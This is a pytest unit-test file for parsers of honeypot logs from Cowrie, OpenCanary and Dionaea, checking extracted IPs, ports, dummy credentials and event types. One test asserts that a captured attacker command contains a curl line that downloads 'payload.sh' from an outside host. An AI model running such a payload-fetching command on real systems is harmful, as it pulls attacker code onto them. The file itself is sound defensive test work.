"""
Unit Tests for Parser Correctness on Real Fixtures
Asserts field-level extraction accuracy across Cowrie, OpenCanary, and Dionaea:
- event_type mapping
- IP & Port extraction
- Credentials & Payload preservation
- Timestamp parsing
"""
import os
import json
import pytest
from collectors.parsers.cowrie_parser import CowrieParser
from collectors.parsers.opencanary_parser import OpenCanaryParser
from collectors.parsers.dionaea_parser import DionaeaParser

FIXTURES_DIR = os.path.join(os.path.dirname(__file__), "..", "fixtures")

def test_cowrie_valid_login_fixture():
    path = os.path.join(FIXTURES_DIR, "cowrie", "valid_login.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)

    parser = CowrieParser()
    parsed = parser.parse(raw)

    assert parsed["parser"] == "cowrie"
    assert parsed["event_type"] == "AUTH_SUCCESS"
    assert parsed["source_ip"] == "198.51.100.42"
    assert parsed["source_port"] == 49152
    assert parsed["destination_port"] == 2222
    assert parsed["credentials"]["username"] == "admin"
    assert parsed["credentials"]["password"] == "secretpassword123"
    assert parsed["session_id"] == "sess_cowrie_901"

def test_cowrie_command_fixture():
    path = os.path.join(FIXTURES_DIR, "cowrie", "command.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)

    parser = CowrieParser()
    parsed = parser.parse(raw)

    assert parsed["event_type"] == "COMMAND_EXEC"
    assert "curl -O http://cdn.io/payload.sh" in parsed["command"]
    assert parsed["source_ip"] == "198.51.100.42"

def test_opencanary_http_fixture():
    path = os.path.join(FIXTURES_DIR, "opencanary", "http_alert.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)

    parser = OpenCanaryParser()
    parsed = parser.parse(raw)

    assert parsed["parser"] == "opencanary"
    assert parsed["service"] == "http"
    assert parsed["source_ip"] == "198.51.100.42"
    assert parsed["destination_port"] == 80
    assert parsed["request_details"]["path"] == "/setup.php"

def test_dionaea_smb_fixture():
    path = os.path.join(FIXTURES_DIR, "dionaea", "smb_exploit.json")
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)

    parser = DionaeaParser()
    parsed = parser.parse(raw)

    assert parsed["parser"] == "dionaea"
    assert parsed["event_type"] == "EXPLOITATION_ATTEMPT"
    assert parsed["source_ip"] == "192.168.10.5"
    assert parsed["protocol"] == "smb"
    assert parsed["malware_download"]["md5"] == "5d41402abc4b2a76b9719d911017c592"
